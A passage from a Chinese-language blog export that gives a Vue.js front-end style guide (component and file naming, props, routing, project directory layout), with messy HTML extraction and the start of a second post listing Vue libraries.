2.1.1. 组件规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;hoScD&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 组件名为多个单词</span><br><span class="line"></span><br><span class="line">组件名应该始终是多个单词组成（大于等于 2），且命名规范为`KebabCase`格式。&lt;br /&gt;这样做可以避免跟现有的以及未来的 HTML 元素相冲突，因为所有的 HTML 元素名称都是单个单词的。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  name: 'TodoItem'  // ...};<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  name: 'Todo',  // ...}export default {  name: 'todo-item',  // ...}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;qn0tj&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 组件文件名为 pascal-case 格式</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- my-component.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- myComponent.vue|- MyComponent.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;ZelRK&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) 基础组件文件名为 base 开头，使用完整单词而不是缩写</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- base-button.vue|- base-table.vue|- base-icon.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- MyButton.vue|- VueTable.vue|- Icon.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;nrDxd&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 4) 和父组件紧密耦合的子组件应该以父组件名作为前缀命名</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- todo-list.vue|- todo-list-item.vue|- todo-list-item-button.vue|- user-profile-options.vue （完整单词）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- TodoList.vue|- TodoItem.vue|- TodoButton.vue|- UProfOpts.vue （使用了缩写）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;vPzyN&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 5) 在 Template 模版中使用组件，应使用 PascalCase 模式，并且使用自闭合组件</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><!-- 在单文件组件、字符串模板和 JSX 中 --><MyComponent /><Row><table :column="data"/></Row><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><my-component /> <row><table :column="data"/></row><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;Rdrdy&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 6) 组件的 data 必须是一个函数</span><br><span class="line"></span><br><span class="line">当在组件中使用 data 属性的时候 (除了 new Vue 外的任何地方)，它的值必须是返回一个对象的函数。 因为如果直接是一个对象的话，子组件之间的属性值会互相影响。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  data () {    return {      name: 'jack'    }  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  data: {    name: 'jack'  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;iGRed&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 7) Prop 定义应该尽量详细</span><br><span class="line"></span><br><span class="line">- 必须使用 camelCase 驼峰命名</span><br><span class="line">- 必须指定类型</span><br><span class="line">- 必须加上注释，表明其含义</span><br><span class="line">- 必须加上 required 或者 default，两者二选其一</span><br><span class="line">- 如果有业务需要，必须加上 validator 验证</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>props: {  // 组件状态，用于控制组件的颜色   status: {     type: String,     required: true,     validator: function (value) {       return [         'succ',         'info',         'error'       ].indexOf(value) !== -1     }   },    // 用户级别，用于显示皇冠个数   userLevel：{      type: String,      required: true   }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;Qavrp&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 8) 为组件样式设置作用域</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <button class="btn btn-close">X</button></template><!-- 使用 `scoped` 特性 --><style scoped>  .btn-close {    background-color: red;  }</style><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <button class="btn btn-close">X</button></template><!-- 没有使用 `scoped` 特性 --><style>  .btn-close {    background-color: red;  }</style><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;PyIFU&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 9) 如果特性元素较多，应该主动换行</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><MyComponent foo="a" bar="b" baz="c"    foo="a" bar="b" baz="c"    foo="a" bar="b" baz="c" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><MyComponent foo="a" bar="b" baz="c" foo="a" bar="b" baz="c" foo="a" bar="b" baz="c" foo="a" bar="b" baz="c"/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;iUoBM&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.2. 模板中使用简单的表达式</span><br><span class="line"></span><br><span class="line">组件模板应该只包含简单的表达式，复杂的表达式则应该重构为计算属性或方法。复杂表达式会让你的模板变得不那么声明式。我们应该尽量描述应该出现的是什么，而非如何计算那个值。而且计算属性和方法使得代码可以重用。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <p></p></template>// 复杂表达式已经移入一个计算属性computed: {  normalizedFullName: function () {    return this.fullName.split(' ').map(function (word) {      return word[0].toUpperCase() + word.slice(1)    }).join(' ')  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <p>       {          fullName.split(' ').map(function (word) {             return word[0].toUpperCase() + word.slice(1)           }).join(' ')        }  </p></template><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;tpW6a&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.3 指令都使用缩写形式</span><br><span class="line"></span><br><span class="line">指令推荐都使用缩写形式，(用 : 表示 v-bind: 、用 @ 表示 v-on: 和用 # 表示 v-slot:)&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><input  @input="onInput"  @focus="onFocus"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><input  v-on:input="onInput"  @focus="onFocus"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;XKmR7&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.4 标签顺序保持一致</span><br><span class="line"></span><br><span class="line">单文件组件应该总是让标签顺序保持为 `&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>...</template><script>...</script><style>...</style><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>...</template><style>...</style><script>...</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;kJIqE&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.5 必须为 v-for 设置键值 key</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;wBAPB&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.6 v-show 与 v-if 选择</span><br><span class="line"></span><br><span class="line">如果运行时，需要非常频繁地切换，使用 v-show ；如果在运行时，条件很少改变，使用 v-if。</span><br><span class="line">&lt;a name=&quot;KxH9Y&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.7 script 标签内部结构顺序</span><br><span class="line"></span><br><span class="line">components &gt; props &gt; data &gt; computed &gt; watch &gt; filter &gt; 钩子函数（钩子函数按其执行顺序） &gt; methods</span><br><span class="line">&lt;a name=&quot;QvXxX&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.8 Vue Router 规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;NQAOl&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 页面跳转数据传递使用路由参数</span><br><span class="line"></span><br><span class="line">页面跳转，例如 A 页面跳转到 B 页面，需要将 A 页面的数据传递到 B 页面，推荐使用 路由参数进行传参，而不是将需要传递的数据保存 vuex，然后在 B 页面取出 vuex 的数据，因为如果在 B 页面刷新会导致 vuex 数据丢失，导致 B 页面无法正常显示数据。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>let id = ' 123';this.$router.push({ name: 'userCenter', query: { id: id } });<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;vMEBJ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 使用路由懒加载（延迟加载）机制</span><br><span class="line"></span><br></pre></td></tr></table></figure>{        path: '/uploadAttachment',        name: 'uploadAttachment',        meta: {          title: '上传附件'        },        component: () => import('@/view/components/uploadAttachment/index.vue')      },<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;rrKVt&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) router 中的命名规范</span><br><span class="line"></span><br><span class="line">path、childrenPoints 命名规范采用`kebab-case`命名规范（尽量 vue 文件的目录结构保持一致，因为目录、文件名都是`kebab-case`，这样很方便找到对应的文件）&lt;br /&gt;name 命名规范采用`KebabCase`命名规范且和 component 组件名保持一致！（因为要保持 keep-alive 特性，keep-alive 按照 component 的 name 进行缓存，所以两者必须高度保持一致）</span><br><span class="line"></span><br></pre></td></tr></table></figure>// 动态加载export const reload = [  {    path: '/reload',    name: 'reload',    component: Main,    meta: {      title: '动态加载',      icon: 'icon iconfont'    },    children: [      {        path: '/reload/smart-reload-list',        name: 'SmartReloadList',        meta: {          title: 'SmartReload',          childrenPoints: [            {              title: '查询',              name: 'smart-reload-search'            },            {              title: '执行reload',              name: 'smart-reload-update'            },            {              title: '查看执行结果',              name: 'smart-reload-result'            }          ]        },        component: () =>          import('@/views/reload/smart-reload/smart-reload-list.vue')      }    ]  }];<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;Qz6x3&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 4) router 中的 path 命名规范</span><br><span class="line"></span><br><span class="line">path 除了采用`kebab-case`命名规范以外，必须以 / 开头，即使是 children 里的 path 也要以 / 开头。如下示例</span><br><span class="line"></span><br><span class="line">- &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">目的：&lt;br /&gt;经常有这样的场景：某个页面有问题，要立刻找到这个 vue 文件，如果不用以/开头，path 为 parent 和 children 组成的，可能经常需要在 router 文件里搜索多次才能找到，而如果以/开头，则能立刻搜索到对应的组件&lt;br /&gt;\*</span><br><span class="line"></span><br></pre></td></tr></table></figure>{    path: '/file',    name: 'File',    component: Main,    meta: {      title: '文件服务',      icon: 'ios-cloud-upload'    },    children: [      {        path: '/file/file-list',        name: 'FileList',        component: () => import('@/views/file/file-list.vue')      },      {        path: '/file/file-add',        name: 'FileAdd',        component: () => import('@/views/file/file-add.vue')      },      {        path: '/file/file-update',        name: 'FileUpdate',        component: () => import('@/views/file/file-update.vue')      }    ]  }<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;XO9zt&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (二) Vue 项目目录规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;WZHqs&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.2.1 基础</span><br><span class="line"></span><br><span class="line">vue 项目中的所有命名一定要与后端命名统一。&lt;br /&gt;比如权限：后端 privilege, 前端无论 router , store, api 等都必须使用 privielege 单词！</span><br><span class="line">&lt;a name=&quot;rttWc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.2.2 使用 Vue-cli 脚手架</span><br><span class="line"></span><br><span class="line">使用 vue-cli3 来初始化项目，项目名按照上面的命名规范。</span><br><span class="line">&lt;a name=&quot;cCzVN&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.2.3 目录说明</span><br><span class="line"></span><br><span class="line">目录名按照上面的命名规范，其中 components 组件用大写驼峰，其余除 components 组件目录外的所有目录均使用 kebab-case 命名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>src                               源码目录|-- api                              所有api接口|-- assets                           静态资源，images, icons, styles等|-- components                       公用组件|-- config                           配置信息|-- constants                        常量信息，项目所有Enum, 全局常量等|-- directives                       自定义指令|-- filters                          过滤器，全局工具|-- datas                            模拟数据，临时存放|-- lib                              外部引用的插件存放及修改文件|-- mock                             模拟接口，临时存放|-- plugins                          插件，全局使用|-- router                           路由，统一管理|-- store                            vuex, 统一管理|-- themes                           自定义样式主题|-- views                            视图目录|   |-- role                             role模块名|   |-- |-- role-list.vue                    role列表页面|   |-- |-- role-add.vue                     role新建页面|   |-- |-- role-update.vue                  role更新页面|   |-- |-- index.less                      role模块样式|   |-- |-- components                      role模块通用组件文件夹|   |-- employee                         employee模块<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;lBRiA&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) api 目录</span><br><span class="line"></span><br><span class="line">- 文件、变量命名要与后端保持一致。</span><br><span class="line">- 此目录对应后端 API 接口，按照后端一个 controller 一个 api js 文件。若项目较大时，可以按照业务划分子目录，并与后端保持一致。</span><br><span class="line">- api 中的方法名字要与后端 api url 尽量保持语义高度一致性。</span><br><span class="line">- 对于 api 中的每个方法要添加注释，注释与后端 swagger 文档保持一致。</span><br><span class="line"></span><br><span class="line">正例：&lt;br /&gt;后端 url： EmployeeController.java</span><br><span class="line"></span><br></pre></td></tr></table></figure>/employee/add/employee/delete/{id}/employee/update<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">前端： employee.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>// 添加员工  addEmployee: (data) => {    return postAxios('/employee/add', data)  },  // 更新员工信息  updateEmployee: (data) => {    return postAxios('/employee/update', data)  },    // 删除员工  deleteEmployee: (employeeId) => {    return postAxios('/employee/delete/' + employeeId)   },<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;FUcNR&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) assets 目录</span><br><span class="line"></span><br><span class="line">assets 为静态资源，里面存放 images, styles, icons 等静态资源，静态资源命名格式为 kebab-case</span><br><span class="line"></span><br></pre></td></tr></table></figure>|assets|-- icons|-- images|   |-- background-color.png|   |-- upload-header.png|-- styles<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;QRtKi&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) components 目录</span><br><span class="line"></span><br><span class="line">此目录应按照组件进行目录划分，目录命名为 KebabCase，组件命名规则也为 KebabCase</span><br><span class="line"></span><br></pre></td></tr></table></figure>|components|-- error-log|   |-- index.vue|   |-- index.less|-- markdown-editor|   |-- index.vue|   |-- index.js|-- kebab-case<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;OD26G&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 4) constants 目录</span><br><span class="line"></span><br><span class="line">此目录存放项目所有常量，如果常量在 vue 中使用，请使用 vue-enum 插件([https://www.npmjs.com/package/vue-enum](https://www.npmjs.com/package/vue-enum))&lt;br /&gt;目录结构：</span><br><span class="line"></span><br></pre></td></tr></table></figure>|constants|-- index.js|-- role.js|-- employee.js<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例子： employee.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>export const EMPLOYEE_STATUS = {  NORMAL: {    value: 1,    desc: '正常'  },  DISABLED: {    value: 1,    desc: '禁用'  },  DELETED: {    value: 2,    desc: '已删除'  }};export const EMPLOYEE_ACCOUNT_TYPE = {  QQ: {    value: 1,    desc: 'QQ登录'  },  WECHAT: {    value: 2,    desc: '微信登录'  },  DINGDING: {    value: 3,    desc: '钉钉登录'  },  USERNAME: {    value: 4,    desc: '用户名密码登录'  }};export default {  EMPLOYEE_STATUS,  EMPLOYEE_ACCOUNT_TYPE};<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;XPGn4&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 5) router 与 store 目录</span><br><span class="line"></span><br><span class="line">这两个目录一定要将业务进行拆分，不能放到一个 js 文件里。&lt;br /&gt;router 尽量按照 views 中的结构保持一致&lt;br /&gt;store 按照业务进行拆分不同的 js 文件</span><br><span class="line">&lt;a name=&quot;aCZ5V&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 6) views 目录</span><br><span class="line"></span><br><span class="line">- 命名要与后端、router、api 等保持一致</span><br><span class="line">- components 中组件要使用 PascalCase 规则</span><br><span class="line"></span><br></pre></td></tr></table></figure>|-- views                            视图目录|   |-- role                             role模块名|   |   |-- role-list.vue                    role列表页面|   |   |-- role-add.vue                     role新建页面|   |   |-- role-update.vue                  role更新页面|   |   |-- index.less                      role模块样式|   |   |-- components                      role模块通用组件文件夹|   |   |   |-- role-header.vue                        role头部组件|   |   |   |-- role-modal.vue                         role弹出框组件|   |-- employee                         employee模块|   |-- behavior-log                      行为日志log模块|   |-- code-generator                    代码生成器模块```<p><a name="SdZof"></a></p><h4 id="2-2-4-注释说明"><a href="#2-2-4-注释说明" class="headerlink" title="2.2.4 注释说明"></a>2.2.4 注释说明</h4><p>整理必须加注释的地方</p><ul><li>公共组件使用说明</li><li>api 目录的接口 js 文件必须加注释</li><li>store 中的 state, mutation, action 等必须加注释</li><li>vue 文件中的 template 必须加注释，若文件较大添加 start end 注释</li><li>vue 文件的 methods，每个 method 必须添加注释</li><li>vue 文件的 data, 非常见单词要加注释<br><a name="flWca"></a></li></ul><h4 id="2-2-5-其他"><a href="#2-2-5-其他" class="headerlink" title="2.2.5 其他"></a>2.2.5 其他</h4><p><a name="J7MHY"></a></p><h5 id="1-尽量不要手动操作-DOM"><a href="#1-尽量不要手动操作-DOM" class="headerlink" title="1) 尽量不要手动操作 DOM"></a>1) 尽量不要手动操作 DOM</h5><p>因使用 vue 框架，所以在项目开发中尽量使用 vue 的数据驱动更新 DOM，尽量（不到万不得已）不要手动操作 DOM，包括：增删改 dom 元素、以及更改样式、添加事件等。<br><a name="Bv2v1"></a></p><h5 id="2-删除无用代码"><a href="#2-删除无用代码" class="headerlink" title="2) 删除无用代码"></a>2) 删除无用代码</h5><p>因使用了 git&#x2F;svn 等代码版本工具，对于无用代码必须及时删除，例如：一些调试的 console 语句、无用的弃用功能代码。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 规范 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 规范 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue 库</title>
      <link href="/2021/09/19/frontend/collection/wheel/vue-ku/"/>
      <url>/2021/09/19/frontend/collection/wheel/vue-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658249113976-aac50b99-5921-4a3b-a7e8-0ebadac449dd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658249113976-aac50b99-5921-4a3b-a7e8-0ebadac449dd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="SiTly"></a></p><h1 id="1-状态管理"><a href="#1-状态管理" class="headerlink" title="1. 状态管理"></a>1. 状态管理</h1><p><a name="fzcN6"></a></p><h2 id="（1）Pinia"><a href="#（1）Pinia" class="headerlink" title="（1）Pinia"></a>（1）Pinia</h2><p>Pinia 是最新一代的 Vue 轻量级状态管理库。它适用于 Vue 2.x 和 Vue 3.x。它是 Vue 官方成员在 2019 年 11 月重新设计的一个状态存储库，它允许你跨组件&#x2F;页面共享状态，并且是响应式的，类似于 Vuex。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658240532615-2a0e69d6-67b6-4fc7-86f0-85ede2ca5efc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658240532615-2a0e69d6-67b6-4fc7-86f0-85ede2ca5efc.png" 